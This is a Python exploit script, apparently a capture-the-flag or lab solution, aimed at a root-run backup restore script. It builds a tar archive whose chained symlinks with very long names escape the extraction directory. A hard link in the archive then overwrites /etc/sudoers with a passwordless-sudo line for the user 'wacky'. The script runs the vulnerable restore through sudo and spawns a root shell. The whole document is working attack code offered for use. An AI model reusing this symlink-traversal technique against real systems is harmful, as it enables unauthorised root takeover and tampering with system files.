#!/usr/bin/env python3
"""
Complete Tar Symlink Path Traversal Exploit
Exploits restore_backup_clients.py to gain root access
"""

import tarfile
import os
import io
import sys
import subprocess
import shutil

print("=" * 60)
print("Tar Symlink Path Traversal Exploit")
print("Target: restore_backup_clients.py")
print("=" * 60)
print()

# Step 1: Create malicious tar archive
print("[*] Step 1: Creating malicious tar archive...")

comp = 'd' * 247
steps = "abcdefghijklmnop"
path = ""

with tarfile.open("/tmp/backup_9999.tar", mode="w") as tar:
    for i in steps:
        a = tarfile.TarInfo(os.path.join(path, comp))
        a.type = tarfile.DIRTYPE
        tar.addfile(a)

        b = tarfile.TarInfo(os.path.join(path, i))
        b.type = tarfile.SYMTYPE
        b.linkname = comp
        tar.addfile(b)

        path = os.path.join(path, comp)

    linkpath = os.path.join("/".join(steps), "l" * 254)
    l = tarfile.TarInfo(linkpath)
    l.type = tarfile.SYMTYPE
    l.linkname = "../" * len(steps)
    tar.addfile(l)

    e = tarfile.TarInfo("escape")
    e.type = tarfile.SYMTYPE
    e.linkname = linkpath + "/../../../../../../../etc"
    tar.addfile(e)

    f = tarfile.TarInfo("sudoers_link")
    f.type = tarfile.LNKTYPE
    f.linkname = "escape/sudoers"
    tar.addfile(f)

    content = b"wacky ALL=(ALL) NOPASSWD: ALL\n"
    c = tarfile.TarInfo("sudoers_link")
    c.type = tarfile.REGTYPE
    c.size = len(content)
    tar.addfile(c, fileobj=io.BytesIO(content))

print("[+] Malicious tar created: /tmp/backup_9999.tar")

# Step 2: Copy to backups directory
print("\n[*] Step 2: Copying to /opt/backup_clients/backups/...")

try:
    shutil.copy('/tmp/backup_9999.tar', '/opt/backup_clients/backups/')
    print("[+] Backup copied successfully")
except Exception as e:
    print(f"[!] Copy failed: {e}")
    print("[*] Trying with subprocess...")
    result = subprocess.run(
        ['cp', '/tmp/backup_9999.tar', '/opt/backup_clients/backups/'],
        capture_output=True,
        text=True)
    if result.returncode == 0:
        print("[+] Backup copied successfully")

# Step 3: Create restore directory (MUST start with 'restore_')
print("\n[*] Step 3: Creating restore directory...")
restore_dir = 'restore_evil'  # Changed to relative path starting with 'restore_'
if os.path.exists(restore_dir):
    shutil.rmtree(restore_dir)
os.makedirs(restore_dir, exist_ok=True)
print(f"[+] Restore directory created: {restore_dir}")

# Step 4: Execute the vulnerable script
print("\n[*] Step 4: Executing vulnerable script as root...")

cmd = [
    'sudo', '/usr/local/bin/python3',
    '/opt/backup_clients/restore_backup_clients.py', '-b', 'backup_9999.tar',
    '-r', restore_dir
]

print(f"[*] Command: {' '.join(cmd)}")

result = subprocess.run(cmd,
                        capture_output=True,
                        text=True,
                        cwd='/opt/backup_clients/backups')

print(result.stdout)
if result.stderr:
    print("STDERR:", result.stderr)

# Step 5: Verify exploit success
print("\n[*] Step 5: Verifying exploit...")

# Test passwordless sudo
test = subprocess.run(['sudo', '-n', 'whoami'], capture_output=True, text=True)

if test.returncode == 0 and 'root' in test.stdout:
    print("[+] ✓ SUCCESS! Passwordless sudo is active!")
    print("[+] ✓ You are now in the sudoers file!")
    print()
    print("=" * 60)
    print("EXPLOITATION SUCCESSFUL!")
    print("=" * 60)
    print()
    print("[*] Spawning root shell...")
    print()

    # Spawn root shell
    os.system('sudo su')

else:
    print("[!] Testing sudo access...")
    print("[*] Trying: sudo su")
    os.system('sudo su')
